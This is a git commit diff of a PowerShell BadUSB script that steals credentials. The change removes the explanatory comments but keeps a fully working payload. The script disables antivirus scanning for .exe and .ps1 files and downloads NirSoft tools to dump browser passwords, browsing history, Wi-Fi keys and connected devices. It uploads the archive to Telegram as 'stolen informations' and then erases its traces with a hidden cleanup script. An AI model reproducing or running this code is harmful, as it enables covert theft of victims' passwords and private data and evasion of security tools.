19e7adda29793740de3092db0b5c7351455a629a
idontknow-CC <2sob.3r0th3rcc@gmail.com>
2025-04-02 21:16:03 +1400

    Update window_ciaoV2_upload.ps1

--- window_ciaoV2_upload.ps1
+++ window_ciaoV2_upload.ps1
@@ -1,24 +1,23 @@
-Set-Location C:\Users\Public\Documents #Go to the folder in which we will download files
-Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
+Set-Location C:\Users\Public\Documents 
+Add-MpPreference -ExclusionExtension exe -Force
 Add-MpPreference -ExclusionExtension ps1 -Force
 Set-ExecutionPolicy unrestricted -Force
-New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory #Create dump/ directory to put all informations that we'll steal in it
-Invoke-WebRequest https://raw.githubusercontent.com/idontknow-CC/gigido/main/fin_upload.ps1 -OutFile fin_upload.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe #Download the nirsoft tool for connected devces
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe #Download the nirsoft tool for WiFi passwords
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe #Download the nirsoft tool for Browser passwords
-Invoke-WebRequest https://github.com/idontknow-CC/gigido/raw/main/window_telegram_uploader.exe -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
-.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt #Create the file for Browser passwords
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt #Create the file for Browser history
-.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt #Create the file for WiFi passwords
-.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt #Create the file for connected devices
-Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
+New-Item -Path "C:\Users\Public\Documents\dump" -ItemType Directory
+Invoke-WebRequest https://raw.githubusercontent.com/idontknow-CC/gigido/main/fin_upload.ps1 -OutFile fin_upload.ps1 
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
+Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
+Invoke-WebRequest https://github.com/idontknow-CC/gigido/raw/main/window_telegram_uploader.exe -OutFile telegram_uploader.exe
+.\WebBrowserPassView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt 
+.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt
+.\WirelessKeyView.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt 
+.\WNetWatcher.exe /stext $env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt 
+Start-Sleep -Seconds 60 
 Move-Item -Path "$env:USERNAME-$(get-date -f yyyy-MM-dd)_passwords.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_history.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_wifi.txt", "$env:USERNAME-$(get-date -f yyyy-MM-dd)_connected_devices.txt" -Destination dump/
-Compress-Archive dump/ dump.zip #Compress dump/ folder to upload it on telegram
-./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations !" #Upload dump.zip on telegram
-Start-Sleep -Seconds 15 #Wait 15 seconds
-#Delete nirsoft tools and .ps1 file
+Compress-Archive dump/ dump.zip
+./telegram_uploader.exe -f dump.zip -c "Here are all stolen informations from $env:USERNAME!"
+Start-Sleep -Seconds 15 
 Remove-Item BrowsingHistoryView.exe
 Remove-Item WNetWatcher.exe
 Remove-Item WNetWatcher.cfg
@@ -26,6 +25,5 @@ Remove-Item WirelessKeyView.exe
 Remove-Item WebBrowserPassView.exe
 Remove-Item ciaoV2_upload.ps1
 Remove-Item telegram_uploader.exe
-#Enable and disable capslock to know when you can eject BadUSB
-Remove-MpPreference -ExclusionExtension exe -Force #Reset antivirus exception
-powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 #Start final .ps1 file to delete all .txt files (because in this .ps1 .txt files are considerated in-use
+Remove-MpPreference -ExclusionExtension exe -Force
+powershell.exe -noexit -windowstyle hidden -file fin_upload.ps1 
